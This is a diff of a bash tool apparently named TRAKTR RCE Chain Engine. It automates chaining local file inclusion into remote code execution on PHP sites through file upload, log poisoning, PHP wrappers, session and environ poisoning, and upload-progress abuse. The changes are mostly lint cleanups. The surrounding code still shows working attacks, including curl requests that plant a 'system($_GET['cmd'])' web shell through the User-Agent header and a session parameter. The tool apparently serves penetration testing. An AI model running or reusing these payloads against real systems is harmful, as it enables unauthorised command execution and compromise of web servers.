@@ -1,4 +1,5 @@
 #!/usr/bin/env bash
+# shellcheck disable=SC2016  # Single-quoted PHP payloads are intentional — not bash expansions
 # TRAKTR RCE Chain Engine v2.0
 # Chains multiple vulnerabilities to achieve Remote Code Execution
 # Techniques: LFI+Upload, LFI+LogPoison, LFI+PHPWrapper, LFI+SessionPoison,
@@ -16,7 +17,7 @@ rce_escalate() {
 
   local outdir="${1:-${OUTDIR:-/tmp}}"
   local target="${TARGET:-unknown}"
-  local oscp="${OSCP:-false}"
+  local _oscp="${OSCP:-false}"
   local rce_dir="${outdir}/rce"
   mkdir -p "$rce_dir"
 
@@ -162,11 +163,11 @@ _rce_source_disclosure() {
   echo -e "\033[1;36m  ┌─── Phase 1: Source Code Disclosure ──────────────────\033[0m" >&2
 
   # Get working LFI payload info
-  local lfi_url="" lfi_param="" lfi_bypass=""
+  local lfi_url="" lfi_param="" _lfi_bypass=""
   if [[ -f "${outdir}/vuln/lfi.json" ]]; then
     lfi_url=$(grep -oP '"url"\s*:\s*"[^"]+' "${outdir}/vuln/lfi.json" | head -1 | sed 's/"url"\s*:\s*"//')
     lfi_param=$(grep -oP '"param"\s*:\s*"[^"]+' "${outdir}/vuln/lfi.json" | head -1 | sed 's/"param"\s*:\s*"//')
-    lfi_bypass=$(grep -oP '"encoding"\s*:\s*"[^"]+' "${outdir}/vuln/lfi.json" | head -1 | sed 's/"encoding"\s*:\s*"//')
+    _lfi_bypass=$(grep -oP '"encoding"\s*:\s*"[^"]+' "${outdir}/vuln/lfi.json" | head -1 | sed 's/"encoding"\s*:\s*"//')
   fi
   [[ -z "$lfi_url" ]] || [[ -z "$lfi_param" ]] && { echo -e "\033[2m  │ No usable LFI finding\033[0m" >&2; return 1; }
 
@@ -239,7 +240,8 @@ _rce_source_disclosure() {
   local sources_read=0
   for page_path in "${unique_pages[@]}"; do
     local source_content=""
-    local resp_file="${rce_dir}/src_$(echo "$page_path" | tr '/' '_').txt"
+    local resp_file
+    resp_file="${rce_dir}/src_$(echo "$page_path" | tr '/' '_').txt"
     local rel_path="${page_path#/}"  # e.g. "contact.php" or "api/application.php"
 
     # Strategy 1: Single traverse from LFI base dir (most common)
@@ -322,8 +324,8 @@ _rce_source_disclosure() {
 
       # === ANALYZE: file upload handling ===
       if echo "$source_content" | grep -qP 'move_uploaded_file|\$_FILES\[|type.*file|enctype.*multipart' 2>/dev/null; then
-        local upload_info
-        upload_info=$(echo "$source_content" | grep -oP '(move_uploaded_file|copy)\s*\([^)]+\)' 2>/dev/null | head -3)
+        local _upload_info
+        _upload_info=$(echo "$source_content" | grep -oP '(move_uploaded_file|copy)\s*\([^)]+\)' 2>/dev/null | head -3)
         local upload_path
         upload_path=$(echo "$source_content" | grep -oP '(move_uploaded_file|copy)\s*\([^,]+,\s*\K[^)]+' 2>/dev/null | head -1)
         local ext_check
@@ -414,11 +416,11 @@ _rce_upload_include_chain() {
   [[ -z "$upload_page" ]] && { echo -e "\033[2m  │ No upload endpoint found\033[0m" >&2; return 1; }
 
   # Read ALL include endpoints
-  local include_page="" include_code=""
+  local include_page="" _include_code=""
   while IFS='|' read -r page code; do
     [[ -z "$page" ]] && continue
     include_page="$page"
-    include_code="$code"
+    _include_code="$code"
     break
   done < <(head -1 "${rce_dir}/include_endpoints.txt")
   [[ -z "$include_page" ]] && { echo -e "\033[2m  │ No include endpoint found\033[0m" >&2; return 1; }
@@ -444,11 +446,13 @@ _rce_upload_include_chain() {
 
   # DYNAMIC: Get file field name (from PHP source or HTML)
   local file_field="file"
-  local field_file="${rce_dir}/file_field_$(echo "$upload_page" | tr '/' '_').txt"
+  local field_file
+  field_file="${rce_dir}/file_field_$(echo "$upload_page" | tr '/' '_').txt"
   [[ -f "$field_file" ]] && file_field=$(cat "$field_file" 2>/dev/null)
 
   # DYNAMIC: Get ALL form fields from HTML analysis
-  local form_fields_file="${rce_dir}/form_fields_$(echo "$upload_page" | tr '/' '_').txt"
+  local form_fields_file
+  form_fields_file="${rce_dir}/form_fields_$(echo "$upload_page" | tr '/' '_').txt"
   local -a extra_fields=()
 
   if [[ -f "$form_fields_file" ]]; then
@@ -545,14 +549,16 @@ _rce_upload_include_chain() {
 
   # === Step 5: DYNAMIC — Extract include parameter from source ===
   local include_param=""
-  local params_file="${rce_dir}/include_params_$(echo "$include_page" | tr '/' '_').txt"
+  local params_file
+  params_file="${rce_dir}/include_params_$(echo "$include_page" | tr '/' '_').txt"
   if [[ -f "$params_file" ]]; then
     # Use the first parameter from the include page's source
     include_param=$(head -1 "$params_file")
   fi
   # Fallback: try extracting from the source file directly
   if [[ -z "$include_param" ]]; then
-    local src_file="${rce_dir}/src_$(echo "$include_page" | tr '/' '_').txt"
+    local src_file
+    src_file="${rce_dir}/src_$(echo "$include_page" | tr '/' '_').txt"
     [[ -f "$src_file" ]] && include_param=$(grep -oP '\$_GET\[["'"'"']\K[^"'"'"']+' "$src_file" 2>/dev/null | head -1)
     [[ -z "$include_param" ]] && [[ -f "$src_file" ]] && include_param=$(grep -oP '\$_REQUEST\[["'"'"']\K[^"'"'"']+' "$src_file" 2>/dev/null | head -1)
     [[ -z "$include_param" ]] && [[ -f "$src_file" ]] && include_param=$(grep -oP '\$_POST\[["'"'"']\K[^"'"'"']+' "$src_file" 2>/dev/null | head -1)
@@ -566,12 +572,14 @@ _rce_upload_include_chain() {
 
   # === Step 6: DYNAMIC — Determine include base dir and build traversal ===
   local include_basedir=""
-  local basedir_file="${rce_dir}/include_basedir_$(echo "$include_page" | tr '/' '_').txt"
+  local basedir_file
+  basedir_file="${rce_dir}/include_basedir_$(echo "$include_page" | tr '/' '_').txt"
   [[ -f "$basedir_file" ]] && include_basedir=$(cat "$basedir_file" 2>/dev/null)
 
   # Check if .php is auto-appended to the include
   local auto_php=false
-  local src_file="${rce_dir}/src_$(echo "$include_page" | tr '/' '_').txt"
+  local src_file
+  src_file="${rce_dir}/src_$(echo "$include_page" | tr '/' '_').txt"
   if [[ -f "$src_file" ]]; then
     grep -qP '(include|require).*?\.php' "$src_file" 2>/dev/null && auto_php=true
   fi
@@ -655,13 +663,14 @@ _rce_php_wrapper_chain() {
   local target="${TARGET:-unknown}"
   local target_base="${target%%\?*}"
 
-  while IFS='|' read -r include_page include_code; do
+  while IFS='|' read -r include_page _include_code; do
     [[ -z "$include_page" ]] && continue
     local include_url="${target_base}${include_page}"
 
     # DYNAMIC: Get parameter name
     local include_param=""
-    local params_file="${rce_dir}/include_params_$(echo "$include_page" | tr '/' '_').txt"
+    local params_file
+    params_file="${rce_dir}/include_params_$(echo "$include_page" | tr '/' '_').txt"
     [[ -f "$params_file" ]] && include_param=$(head -1 "$params_file")
     if [[ -z "$include_param" ]]; then
       include_param=$(grep -oP '\$_GET\[["'"'"']\K[^"'"'"']+' "${rce_dir}/src_$(echo "$include_page" | tr '/' '_').txt" 2>/dev/null | head -1)
@@ -760,17 +769,19 @@ _rce_log_poison_include() {
   }
 
   # Inject PHP via User-Agent
-  local marker="TRAKTR_RCE_$(date +%s)"
+  local marker
+  marker="TRAKTR_RCE_$(date +%s)"
   curl -sk -o /dev/null -H "User-Agent: <?php echo '${marker}'; system(\$_GET['cmd']); ?>" "${target_base}/" < /dev/null 2>/dev/null
 
   # Try to include the log via each discovered include() endpoint
-  while IFS='|' read -r include_page include_code; do
+  while IFS='|' read -r include_page _include_code; do
     [[ -z "$include_page" ]] && continue
     local include_url="${target_base}${include_page}"
 
     # DYNAMIC: Get parameter
     local include_param=""
-    local params_file="${rce_dir}/include_params_$(echo "$include_page" | tr '/' '_').txt"
+    local params_file
+    params_file="${rce_dir}/include_params_$(echo "$include_page" | tr '/' '_').txt"
     [[ -f "$params_file" ]] && include_param=$(head -1 "$params_file")
     [[ -z "$include_param" ]] && include_param=$(grep -oP '\$_GET\[["'"'"']\K[^"'"'"']+' "${rce_dir}/src_$(echo "$include_page" | tr '/' '_').txt" 2>/dev/null | head -1)
     [[ -z "$include_param" ]] && continue
@@ -780,7 +791,8 @@ _rce_log_poison_include() {
 
     # DYNAMIC: Build traversal depth based on include base dir
     local include_basedir=""
-    local basedir_file="${rce_dir}/include_basedir_$(echo "$include_page" | tr '/' '_').txt"
+    local basedir_file
+    basedir_file="${rce_dir}/include_basedir_$(echo "$include_page" | tr '/' '_').txt"
     [[ -f "$basedir_file" ]] && include_basedir=$(cat "$basedir_file" 2>/dev/null)
 
     local depth_ups="../../../"
@@ -833,7 +845,8 @@ _rce_session_poison() {
   lfi_param=$(grep -oP '"param"\s*:\s*"[^"]+' "${outdir}/vuln/lfi.json" 2>/dev/null | head -1 | sed 's/"param"\s*:\s*"//')
   [[ -z "$lfi_url" ]] && { echo -e "\033[1;36m  └─── Session Poison: SKIPPED ──────────────────────\033[0m" >&2; return 1; }
 
-  local session_id="traktr_$(date +%s)"
+  local session_id
+  session_id="traktr_$(date +%s)"
   curl -sk -b "PHPSESSID=${session_id}" \
     "${target_base}/?data=<?php system(\$_GET['cmd']); ?>" -o /dev/null < /dev/null 2>/dev/null
   curl -sk -b "PHPSESSID=${session_id}" \
@@ -853,7 +866,8 @@ _rce_session_poison() {
         [[ -z "$include_page" ]] && continue
         local include_url="${target_base}${include_page}"
         local include_param=""
-        local params_file="${rce_dir}/include_params_$(echo "$include_page" | tr '/' '_').txt"
+        local params_file
+        params_file="${rce_dir}/include_params_$(echo "$include_page" | tr '/' '_').txt"
         [[ -f "$params_file" ]] && include_param=$(head -1 "$params_file")
         [[ -z "$include_param" ]] && include_param=$(grep -oP '\$_GET\[["'"'"']\K[^"'"'"']+' "${rce_dir}/src_$(echo "$include_page" | tr '/' '_').txt" 2>/dev/null | head -1)
         [[ -z "$include_param" ]] && continue
@@ -907,7 +921,8 @@ _rce_environ_poison() {
     [[ -z "$include_page" ]] && continue
     local include_url="${target_base}${include_page}"
     local include_param=""
-    local params_file="${rce_dir}/include_params_$(echo "$include_page" | tr '/' '_').txt"
+    local params_file
+    params_file="${rce_dir}/include_params_$(echo "$include_page" | tr '/' '_').txt"
     [[ -f "$params_file" ]] && include_param=$(head -1 "$params_file")
     [[ -z "$include_param" ]] && include_param=$(grep -oP '\$_GET\[["'"'"']\K[^"'"'"']+' "${rce_dir}/src_$(echo "$include_page" | tr '/' '_').txt" 2>/dev/null | head -1)
     [[ -z "$include_param" ]] && continue
@@ -957,14 +972,16 @@ _rce_upload_progress() {
     return 1
   fi
 
-  local session_id="traktr_up_$(date +%s)"
+  local session_id
+  session_id="traktr_up_$(date +%s)"
   local php_code='<?php system($_GET["cmd"]); ?>'
 
   while IFS='|' read -r include_page _; do
     [[ -z "$include_page" ]] && continue
     local include_url="${target_base}${include_page}"
     local include_param=""
-    local params_file="${rce_dir}/include_params_$(echo "$include_page" | tr '/' '_').txt"
+    local params_file
+    params_file="${rce_dir}/include_params_$(echo "$include_page" | tr '/' '_').txt"
     [[ -f "$params_file" ]] && include_param=$(head -1 "$params_file")
     [[ -z "$include_param" ]] && include_param=$(grep -oP '\$_GET\[["'"'"']\K[^"'"'"']+' "${rce_dir}/src_$(echo "$include_page" | tr '/' '_').txt" 2>/dev/null | head -1)
     [[ -z "$include_param" ]] && continue
